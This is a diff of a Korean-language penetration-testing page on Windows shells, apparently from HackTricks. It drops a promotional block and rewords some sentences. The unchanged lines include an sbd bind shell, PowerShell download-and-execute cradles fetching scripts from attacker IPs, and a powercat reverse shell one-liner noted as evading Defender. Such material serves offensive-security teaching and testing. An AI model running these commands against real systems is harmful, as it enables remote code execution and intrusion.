@@ -15,18 +15,10 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Lolbas
 
 페이지 [lolbas-project.github.io](https://lolbas-project.github.io/)는 리눅스의 [https://gtfobins.github.io/](https://gtfobins.github.io/)와 같은 Windows용입니다.\
-명백히, **Windows에는 SUID 파일이나 sudo 권한이 없습니다**, 하지만 **어떻게** 일부 **바이너리**가 **임의 코드를 실행하는** 것과 같은 예기치 않은 작업을 수행하는 데 (악용)될 수 있는지 아는 것은 유용합니다.
+명백히, **Windows에는 SUID 파일이나 sudo 권한이 없습니다**, 하지만 **어떻게** 일부 **바이너리**가 **임의의 코드를 실행하는** 것과 같은 예기치 않은 작업을 수행하는 데 (악용)될 수 있는지 아는 것은 유용합니다.
 
 ## NC
 ```bash
@@ -47,7 +39,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/)는 휴대 가능하고 안전한 Netcat 대안입니다**. Unix 유사 시스템과 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 정의 가능한 소스 포트 및 지속적인 재연결과 같은 기능을 갖춘 sbd는 TCP/IP 통신을 위한 다재다능한 솔루션을 제공합니다. Windows 사용자에게는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 신뢰할 수 있는 대체품으로 사용할 수 있습니다.
+**[sbd](https://www.kali.org/tools/sbd/)는 휴대 가능하고 안전한 Netcat 대안입니다**. Unix 유사 시스템과 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 정의 가능한 소스 포트 및 지속적인 재연결과 같은 기능을 갖춘 sbd는 TCP/IP 통신을 위한 다목적 솔루션을 제공합니다. Windows 사용자에게는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 신뢰할 수 있는 대체품으로 사용할 수 있습니다.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -102,7 +94,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 네트워크 호출을 수행하는 프로세스: **powershell.exe**\
-디스크에 기록된 페이로드: **아니오** (_적어도 procmon을 사용하여 찾을 수 있는 곳은 없습니다!_)
+디스크에 기록된 페이로드: **아니오** (_적어도 procmon을 사용하여 찾을 수 있는 곳에서는 !_ )
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -415,11 +407,11 @@ Defender는 이를 악성 코드로 감지하지 않습니다 (아직, 2019년 3
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-다운로드, 웹 서버 시작, 리스너 시작, 그리고 피해자의 끝에서 실행합니다:
+다운로드하고, 웹 서버를 시작하고, 리스너를 시작한 후, 피해자의 끝에서 실행합니다:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender는 이를 악성 코드로 탐지하지 않습니다 (아직, 2019년 3월 4일).
+Defender는 이를 악성 코드로 감지하지 않습니다 (아직, 2019년 3월 4일).
 
 **powercat이 제공하는 다른 옵션:**
 
@@ -483,12 +475,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) 공격적인 PS 모듈과 프�
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-​
-**Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
